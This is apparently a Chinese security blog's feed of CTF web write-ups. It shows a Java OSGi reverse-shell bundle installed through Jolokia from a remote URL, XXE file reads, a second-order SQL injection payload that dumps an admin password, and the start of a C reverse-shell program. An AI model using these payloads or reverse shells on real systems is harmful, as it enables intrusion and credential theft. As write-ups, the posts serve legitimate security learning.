&#123;</span><br><span class="line">            String ShellPath;</span><br><span class="line">            ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket( str, i );</span><br><span class="line">            Process process = Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">            ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">            ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</span><br><span class="line">        localSocket.getOutputStream().write(<span class="string">"Mi1k7ea"</span>.getBytes());</span><br><span class="line">        localSocket.getOutputStream().flush();</span><br><span class="line">        localSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(BundleContext paramBundleContext)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"RIP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取一下该类的uuid：</p><p><img src="/2019/03/31/0CTF-Web-writeup/9.png" alt=""></p><p>然后通过installBundleFromURL方法来下载安装恶意bundle：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia/list HTTP/1.1</span><br><span class="line">Host: 111.186.63.207:31337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic a2FyYWY6a2FyYWY=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: JSESSIONID=h1fouerlv92j1nzj1rn7f4hyu</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;exec&quot;,</span><br><span class="line">  &quot;mbean&quot;: &quot;osgi.core:framework=org.eclipse.osgi,type=framework,uuid=089717e7-f953-42ec-959f-cd2488bc6482,version=1.7&quot;,</span><br><span class="line">  &quot;operation&quot;: &quot;installBundleFromURL&quot;,</span><br><span class="line">  &quot;arguments&quot;: [</span><br><span class="line">    &quot;moxiaoxi&quot;,</span><br><span class="line">    &quot;http://a.com:666/m7.jar&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过response的id，来启动bundle，就可以获得一个反弹shell：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"type"</span>: <span class="string">"exec"</span>, <span class="attr">"mbean"</span>: <span class="string">"osgi.core:framework=org.eclipse.osgi,type=framework,version=1.7,uuid=089717e7-f953-42ec-959f-cd2488bc6482"</span>, <span class="attr">"operation"</span>: <span class="string">"startBundle"</span>, <span class="attr">"arguments"</span>: [ <span class="string">"93"</span> ] &#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Wallbreaker-Easy"><a href="#0x02-Wallbreaker-Easy" class="headerlink" title="0x02 Wallbreaker Easy"></a>0x02 Wallbreaker Easy</h2><p><a href="http://111.186.63.208:31340" target="_blank" rel="noopener">题目地址</a>，已关闭。</p><p>环境待复现…</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/" target="_blank" rel="noopener">TCTF2019 Web WP</a></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Securinets CTF Web writeup</title>
    <link href="https://Mi1k7ea.github.com/2019/03/29/Securinets-CTF-Web-writeup/"/>
    <id>https://Mi1k7ea.github.com/2019/03/29/Securinets-CTF-Web-writeup/</id>
    <published>2019-03-29T13:41:58.000Z</published>
    <updated>2019-05-28T14:20:05.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Feedback"><a href="#0x01-Feedback" class="headerlink" title="0x01 Feedback"></a>0x01 Feedback</h2><p><a href="https://web2.ctfsecurinets.com/" target="_blank" rel="noopener">题目地址</a>，题目描述如下，提示flag保存在flag文件中：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/1.png" alt=""></p><p>访问页面，是一个输入界面：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/2.png" alt=""></p><p>随便填写内容，Send后发现在下方有回显：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/3.png" alt=""></p><p>抓包发现发送的是XML格式的数据：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/4.png" alt=""></p><p>推测考察的是XXE读取文件，换个XXE payload测试是否解析参数实体：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/5.png" alt=""></p><p>没问题，那就读取本地文件/etc/passwd试试：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/6.png" alt=""></p><p>问题来了，读取flag文件，但不知道绝对路径呀，这里file://伪协议只能读取绝对路径的文件。</p><p>那就换个php://filter伪协议吧，它可以读取相对路径，直接尝试读本目录的flag文件吧：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/7.png" alt=""></p><p>读到了flag，解码为Securinets{Xxe<em>xXE</em>@Ll_Th3_W@Y}。</p><p>当然，可以修改payload看看这个feed.php的内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line"><span class="comment">//$xmlfile = $_POST["ta"];</span></span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$feedback = simplexml_import_dom($dom);</span><br><span class="line">$author = $feedback-&gt;author;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h4&gt;Thanks For you Feedback $author&lt;/h4&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Custom-Location"><a href="#0x02-Custom-Location" class="headerlink" title="0x02 Custom Location"></a>0x02 Custom Location</h2><p><a href="https://web0.ctfsecurinets.com/" target="_blank" rel="noopener">题目地址</a>，题目描述如下，说是找出数据库资格证：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/8.png" alt=""></p><p>访问页面，没啥功能，查看页面源码也没有东西：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/9.png" alt=""></p><p>尝试访问robots.txt来看看是不是有某些提示，出现报错信息，看来是开启了Debug模式，从页面可看出是用了Symfony这个框架来搭建的：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/10.png" alt=""></p><p>随便点击一个php文件即可查看它的源代码。</p><p>那么我们就可以查看index.php了，前提是需要知道这个框架的index.php是在public目录中的：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/11.png" alt=""></p><p>可以看到，里面又包含了一个文件进来，访问该文件，发现里面调用了”secret_ctf_location/env”，再访问该文件在数据库配置的地址找到了flag：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/12.png" alt=""></p><h2 id="0x03-SQL-Injected"><a href="#0x03-SQL-Injected" class="headerlink" title="0x03 SQL Injected"></a>0x03 SQL Injected</h2><p><a href="https://web5.ctfsecurinets.com/" target="_blank" rel="noopener">题目地址</a>，题目描述如下图，标题是SQL注入了，但提示说我不喜欢这名字，而且可以下载代码：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/13.png" alt=""></p><p>访问页面是个登录界面，可注册：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/14.png" alt=""></p><p>随便注册个用户，注册成功后自动登录进界面：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/15.png" alt=""></p><p>点击左上角的Flags界面显示”<strong>Error!</strong> You need to be an admin to access this area”即无权访问。</p><p>在index页面编辑title和内容然后Post，即可在下面更新显示内容：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/16.png" alt=""></p><p>在Find Posts一栏，输入指定用户名会显示该用户发布过的内容：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/17.png" alt=""></p><p>大致功能了解了，现在来源码审计。</p><p>项目目录如下：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/18.png" alt=""></p><p>简单理下，create_db.sql是执行创建数据库表和字段内容的SQL语句；db.php配置数据库连接信息；flags.php即显示Flags页面，其中关键是判断$_SESSION[‘role’]是否为1，是则从包含的secret.php中输出flag；secret.php中保存了flag；logout.php即登出。</p><p>关键的几个文件为login.php、register.php和index.php，因为这几个是程序的主要处理逻辑，涉及到的SQL操作都在这几个文件中。</p><p>先看看register.php关键部分的SQL操作，对用户输入的username和password参数调用了mysqli_real_escape_string()函数进行了转义过滤，然后写入INSERT语句，其中role字段值写死了为0，SQL语句执行成功后即跳转至index.php界面；也就是说，这里没法进行SQL注入了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp;  !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        $success = <span class="keyword">true</span>;</span><br><span class="line">        $username = mysqli_real_escape_string($conn, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $password = mysqli_real_escape_string($conn, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">        $sql = <span class="string">"INSERT INTO users (login, password, role) VALUES ('"</span>. $username .<span class="string">"', '"</span>. $password .<span class="string">"', 0)"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $conn-&gt;query($sql);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $err) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'err: '</span>.$err;</span><br><span class="line">            $success = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $success = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($success) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">        $_SESSION[<span class="string">'message'</span>] = <span class="string">"&lt;div class=\"alert alert-success\"&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;Success!&lt;/strong&gt; Welcome aboard "</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">" !</span></span><br><span class="line"><span class="string">        &lt;/div&gt;"</span>;</span><br><span class="line">        header(<span class="string">'location: index.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样看看login.php中进行SQL操作的代码，都是进行了mysqli_real_escape_string()函数的转义过滤，然后执行SELECT查询语句，这里也无法进行SQL注入；注意到，将查询成功后获取的用户名即login字段值赋给\$_SESSION[‘username’]，将role字段值赋值给​\$_SESSION[‘role’]：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $username = mysqli_real_escape_string($conn, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = mysqli_real_escape_string($conn, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM users WHERE login='"</span>. $username .<span class="string">"' and password='"</span>. $password .<span class="string">"'"</span>;</span><br><span class="line">    $res = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($res-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $res-&gt;fetch_assoc();</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = $user[<span class="string">'login'</span>];</span><br><span class="line">        $_SESSION[<span class="string">'role'</span>] = $user[<span class="string">'role'</span>];</span><br><span class="line">        header(<span class="string">'location: index.php'</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $success = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后看看index.php，可以看到界面输入的参数post、title、post_author等都进行了转义过滤，但是注意到在拼接的SQL语句中有的含有参数$_SESSION[‘username’]：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;post&apos;]) &amp;&amp; isset($_POST[&apos;title&apos;])) &#123;</span><br><span class="line">    if(!empty($_POST[&apos;post&apos;]) &amp;&amp; !empty($_POST[&apos;title&apos;])) &#123;</span><br><span class="line">        $success = true;</span><br><span class="line">        $post = mysqli_real_escape_string($conn, $_POST[&apos;post&apos;]);</span><br><span class="line">        $title = mysqli_real_escape_string($conn, $_POST[&apos;title&apos;]);</span><br><span class="line">        $sql = &quot;INSERT INTO posts (title, content, date, author) VALUES (&apos;&quot;. $title .&quot;&apos;, &apos;&quot;. $post .&quot;&apos;, CURDATE(), &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;)&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            $conn-&gt;query($sql);</span><br><span class="line">        &#125; catch(Exception $err) &#123;</span><br><span class="line">            echo &apos;err: &apos;.$err;</span><br><span class="line">            $success = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $success = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($success) &#123;</span><br><span class="line">        $_SESSION[&apos;message&apos;] = &quot;&lt;div class=\&quot;alert alert-success\&quot;&gt;</span><br><span class="line">            &lt;strong&gt;Success!&lt;/strong&gt; Your post has been saved!</span><br><span class="line">        &lt;/div&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&apos;post_author&apos;])) &#123;</span><br><span class="line">    $sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. mysqli_real_escape_string($conn, $_POST[&apos;post_author&apos;]) .&quot;&apos;&quot;;</span><br><span class="line">    try &#123;</span><br><span class="line">        $posts = $conn-&gt;query($sql);</span><br><span class="line">    &#125; catch(Exception $err) &#123;</span><br><span class="line">        echo &apos;err: &apos;.$err;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;&quot;;</span><br><span class="line">    try &#123;</span><br><span class="line">        $posts = $conn-&gt;query($sql);</span><br><span class="line">    &#125; catch(Exception $err) &#123;</span><br><span class="line">        echo &apos;err: &apos;.$err;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;content&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_SESSION[&apos;message&apos;]) &amp;&amp; $_SESSION[&apos;message&apos;]) &#123;</span><br><span class="line">    echo $_SESSION[&apos;message&apos;];</span><br><span class="line">    $_SESSION[&apos;message&apos;] = null;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;form class=&quot;post-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input class=&quot;form-control&quot; placeholder=&quot;Title&quot; name=&quot;title&quot; style=&quot;margin-bottom: 10px;&quot; /&gt;</span><br><span class="line">        &lt;textarea class=&quot;form-control&quot; placeholder=&quot;Express yourself ...&quot; name=&quot;post&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary post-btn&quot; value=&quot;Post&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;h5 style=&quot;color: gray;&quot;&gt;Find Posts&lt;/h5&gt;</span><br><span class="line">&lt;form class=&quot;post-search&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;input class=&quot;form-control&quot; placeholder=&quot;username&quot; style=&quot;width: 250px;&quot; name=&quot;post_author&quot; value=&quot;&lt;?php echo $_POST[&apos;post_author&apos;] ?&gt;&quot;/&gt; </span><br><span class="line">    &lt;button class=&quot;btn btn-outline-success&quot; type=&quot;submit&quot;&gt; Find &lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;h5 class=\&quot;results-count\&quot;&gt;Results: $posts-&gt;num_rows&lt;/h5&gt;&quot;;</span><br><span class="line">if($posts-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    while($post = $posts-&gt;fetch_assoc()) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;div style=&quot;padding-bottom: 20px&quot;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;h5 style=&quot;display: inline&quot;&gt; &lt;?php echo $post[&apos;title&apos;] ?&gt;&lt;/h5&gt;</span><br><span class="line">            &lt;h6 class=&quot;float-right&quot;&gt; &lt;?php echo $post[&apos;date&apos;] ?&gt;&lt;/h6&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;h6&gt; &lt;?php echo $post[&apos;content&apos;] ?&gt;&lt;/h6&gt;</span><br><span class="line">        &lt;div class=&quot;float-right&quot;&gt; By: &lt;?php echo $post[&apos;author&apos;] ?&gt; &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr/&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>因为以上几个文件中外界输入的参数都进行了mysqli_real_escape_string()函数的转义过滤，因此无法从输入的参数进行直接的SQL注入。但是前面注意到index.php中有些SQL语句含有拼接$_SESSION[‘username’]的写法，先列下出现的语句吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO posts (title, content, date, author) VALUES ('"</span>. $title .<span class="string">"', '"</span>. $post .<span class="string">"', CURDATE(), '"</span>. $_SESSION[<span class="string">'username'</span>] .<span class="string">"')"</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT * FROM posts WHERE author = '"</span>. $_SESSION[<span class="string">'username'</span>] .<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>只有两句，一个为INSERT一个为SELECT语句。前面我们知道$_SESSION[‘username’]是从login.php中查询表的login字段即用户名得来的。</p><p>再回看题目，flag就在Flags界面，但只有role为1的用户才能访问，那就需要SQL注入dump下role为1的用户名/密码登录访问来获取flag了。</p><p>那么就清晰了，在注册时往username进行SQL注入，<strong>虽然注册时调用mysqli_real_escape_string()函数转移过滤了，但是在存储进数据库的时候是你输入时的内容而不包含转义符\，因此在$_SESSION[‘username’]从users表中提取login字段时就是注入时的原格式，在拼接SQL语句时会直接造成SQL注入。</strong></p><p>确认一下，使用M7’作为用户名注册登录，可以看到注册成功后直接跳转过去的index.php界面显示的用户名中的单引号前是有转移符\的，这是因为此时的$_SESSION[‘username’]是由注册时调用mysqli_real_escape_string()函数后直接赋值过来的结果：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/19.png" alt=""></p><p>其实存储在数据库中的内容是没有转移符\的，我们登出再登录，会发现转移符不见了，这是因为此时的$_SESSION[‘username’]是从数据库中查询得来的：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/20.png" alt=""></p><p>OK，那剩下的就是如何进行SQL注入了。</p><p>相比之下INSERT语句作用不大，但SELECT语句可以列出用户名和密码等字段值，因此利用SELECT语句进行SQL注入来dump role为1的用户信息。</p><p>构造payload前先看下create_db.sql中的posts表是存在5个字段，而users表是存在id、login、passwod和role等4个字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> webn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (<span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>, login <span class="built_in">varchar</span>(<span class="number">100</span>), <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">100</span>), <span class="keyword">role</span> <span class="built_in">boolean</span> <span class="keyword">default</span> <span class="number">0</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> posts (<span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>, title <span class="built_in">varchar</span>(<span class="number">50</span>), <span class="keyword">content</span> <span class="built_in">text</span>, <span class="built_in">date</span> <span class="built_in">Date</span>, author <span class="built_in">varchar</span>(<span class="number">100</span>));</span><br></pre></td></tr></table></figure><p>注册输入如下构造的用户名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'union <span class="keyword">select</span> <span class="keyword">id</span>,login,<span class="keyword">password</span>,<span class="keyword">role</span>,<span class="number">5</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">role</span>=<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>注册完新用户后登出再登录，可以看到输出了role为1、login即用户名为root的5个输出字段信息：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/21.png" alt=""></p><p>用root/jjLLgTGk3uif2rKBVwqH登录再访问Flags界面即可拿到flag：</p><p><img src="/2019/03/29/Securinets-CTF-Web-writeup/22.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>C编写实现Linux反弹shell</title>
    <link href="https://Mi1k7ea.github.com/2019/03/24/C%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0Linux%E5%8F%8D%E5%BC%B9shell/"/>
    <id>https://Mi1k7ea.github.com/2019/03/24/C编写实现Linux反弹shell/</id>
    <published>2019-03-24T08:19:50.000Z</published>
    <updated>2019-05-28T14:20:13.842Z</updated>
    
    <content type="html"><![CDATA[<p>网上实现Linux反弹shell的方法各种各样，这里写下用C编写反弹shell的程序。参考了<a href="http://www.361way.com/getshell/1105.html" target="_blank" rel="noopener">linux下C语言版反向shell</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 